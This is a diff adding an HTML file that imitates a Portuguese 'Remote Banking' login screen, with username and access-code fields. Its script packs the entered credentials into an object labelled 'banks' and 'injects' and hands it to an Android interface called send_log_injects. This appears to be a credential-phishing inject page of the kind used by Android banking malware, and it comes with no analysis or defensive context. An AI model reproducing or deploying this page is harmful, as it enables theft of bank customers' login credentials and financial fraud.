@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+            margin-top: 10%;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 4px;
+            border: 0;
+            border-bottom: 1px solid #cccccc;
+            margin-bottom: 40px;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #ccc;
+        }
+
+        .login {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAAAAAByaaZbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjJBNUZDQ0EyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjJBNUZDQ0IyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyMDMxRjk2QjIzNzMxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyMDMxRjk2QzIzNzMxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgzoV8MAAAGBSURBVEjHxZS/a8JAFMfvrz3NEA2CQVvQuli3ZhGU7MGCILgcCILgJNoSZ8kQCAYkaUGHDPGkNM/UmOQSD8R+l/B+fHJ37707dErKIYosCLJCnJQgSnhctYDPKqhuPqCLOCJRzwOmOKZpNqDjhPQswBWTgOhmACrkCJrheYYmgKWyAQfqUzXBNKtQK4cJEPi/GdomrEGYwFsQ1y4OLXAoTEAO4sbFYQQOmQnADryLw4M93g/g3hL3obnLyt047tFIHb6Se8/x5r9A/FeU/xHgf2Zy9A+AvRj12zWxWBRr7f5oYWcC1qRbifeh0p1Y6cB23MAMNcbbOECXHZypzopGgXUT56q5/gMOPXyTegcArPrVNCvD+Wa39/39bjMfKqVorG79AnakMG1i0usqUpO8Rkpmn9CxFVpP5Cu9V9/kOcxpHdEsPNOKsttLP17OaTME5SySY/ZE0Anc8A4qB99l/hB9BollBCvdMnaQ+TDgdj0AkPjyJTTgA96RP+BYQxr4P3ayvBPjQKBFAAAAAElFTkSuQmCC');
+            background-size: 16px;
+            background-repeat: no-repeat;
+            background-position: left 5px center;
+            padding-left: 30px
+        }
+
+        .password {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAA/CAAAAACDPxSOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjJBNUZDQ0UyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjJBNUZDQ0YyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCMkE1RkNDQzIzNzQxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCMkE1RkNDRDIzNzQxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PiQV+xgAAAF/SURBVEjH7ZaxboMwEIb9tFZRIQN0a7uEwUiRMucFKHMzgRTBgDoxpVvTvenG5AjJgNpwgcRggm/o1PwL4o4PuPOPD1IPVG4DzzEMxwu25TBL+gG+tmkne32YAjKHSnKyq0Dl04H8ahyoVlShVTUK+FQpfwzI2iuW6XdR7NNle56pAX6q9/GzjeyeTs06KIE1ZBcXWb6A2KsKKKH/z1xaFXiGLRTAFm72Ibd9B9F3BRBAvf2VhcpfFIDXZN76QNqEmQKAHn31gX0TflAARpMRfaBowncKAKob+rkX/69AGbN7qiGLxeII5HOqLTeviXApQvOSxBSlmDAcwIiFA0wCRyPk9VXxDZiTnoContRGAvg0wCWg1tANkFMiYdaMJUIXyN3OzFrA2fCu0AKSs9USLeDC8EwLuDC8hQVmf/NK6KLRbUUvHFjDQljj9sWNAOiNLJwGIgkwoqnNOGw3YxO33Vv4gYIeWeUcc70rSGdmrSGaHwe7iJnWoDNZ/Pu3/wPHq6d3rMnVHAAAAABJRU5ErkJggg==');
+            background-size: 14px;
+            background-repeat: no-repeat;
+            background-position: left 5px center;
+            padding-left: 30px;
+            padding-right: 30px;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: 0;
+            border-radius: 15px;
+            color: #fff;
+            background-color: #6587d4;
+        }
+
+        .button:disabled {
+            color: #cccccc;
+            background-color: #eeeeee;
+        }
+
+        h4 {
+            font-weight: bolder;
+            margin-bottom: 25px;
+        }
+
+        ::placeholder {
+            color: #666666;
+            opacity: 1;
+        }
+
+        :-moz-placeholder {
+            color: #666666;
+            opacity: 1;
+        }
+
+        ::-moz-placeholder {
+            color: #666666;
+            opacity: 1;
+        }
+
+        :-ms-input-placeholder {
+            color: #666666;
+            opacity: 1;
+        }
+
+        ::-webkit-input-placeholder {
+            color: #666666;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <h4>Ótimo!</h4>
+            <p style="color: #666666;">
+                Use suas credenciais do Remote Banking para inserir
+            </p>
+        </header>
+        <section>
+            <input type="text" class="input login" id="login" name="login" placeholder="Utilizador/CC" autocomplete="off">
+            <input type="password" class="input password" id="password" name="password" placeholder="Código de acceso" autocomplete="off">
+            <img id="eye" style="float: right;width: 18px;position: relative;top: -62px;cursor: pointer;z-index: 99;margin-bottom: -62px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAAAtCAAAAAA/neK7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjJBNUZDRDIyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjJBNUZDRDMyMzc0MTFFQ0E1MTI5MDNGNDZEQjc0ODYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCMkE1RkNEMDIzNzQxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCMkE1RkNEMTIzNzQxMUVDQTUxMjkwM0Y0NkRCNzQ4NiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsxHacgAAAHdSURBVEjHrVZNqwFhFJ5f+2LUnXxMQmyI8lFKLCzsKEPZs1BKKWFzb2wnEo1yIxNddF3vDN4zM0zdc3bznGeeTufrPdzFws7zXq0QFwWXSxDjhVpvfrZicqborlsUCDCh2N3ZlTiP8i5iaq786GxD4tQJkxcW7pzeSfRD5I2F+i8llmliw9JLa4m2m9gyd9tCYl8wcL25SrNZyXkNjsLeTEKJwipKsu6TJVjjqGKUkP0sh2+qz9GqTZ71+2UoIXtYRmQGazeLsAyPzEosgEJKNbaQmgIai2eJbZD1Jg5mnXxIsKzg9iFxSrI+37f+12bQag029y8fy0ue7hJ1kO6h9stUCz011YAhINZ1iU8H68hq41Z9QFVtvLIs0/FFJY4gEWRC6aVnrESxCaAGjzeJBpwjym6xaIuicAobfxJr0DNEolvnA/Qq3TcSIPPrq0QZ9v/YLAg9jDGEyxdOcUJwdeNmIJy5wSsIOxVOMkwhbSsRwiJtLwNd4gIGjNYPZojwtNIGegAjCtu5yFrmAqEiln0h2O8LhO7EmBGEScXYFxhbC2F3Ymxwk3dkDhXmb94RjNcM403FeNkx7guUKwfj1rraz78vPoy7E+X61WKZXW/wGL3BY9cbfGZ5g/8CcSWUs1Hi7SMAAAAASUVORK5CYII=" alt="">
+
+            <p style="text-align: center; color: #6587d4;font-weight: 300;">Necessita de ajuda?</p>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="CONTINUAR">
+        </footer>
+    </form>
+
+    <script>
+        $('#password').mask('000000');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        var eye = document.getElementById('eye');
+
+        eye.onclick = () => {
+            if(password.type === 'password') {
+                password.type = 'text';
+            } else {
+                password.type = 'password';
+            }
+        }
+
+        function checkInputs() {
+            if(login.value.length >= 4 && password.value.length === 4 || login.value.length >= 4 && password.value.length === 6) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        login.onkeyup = () => {
+            checkInputs();
+        }
+
+        password.onkeyup = () => {
+            checkInputs();
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
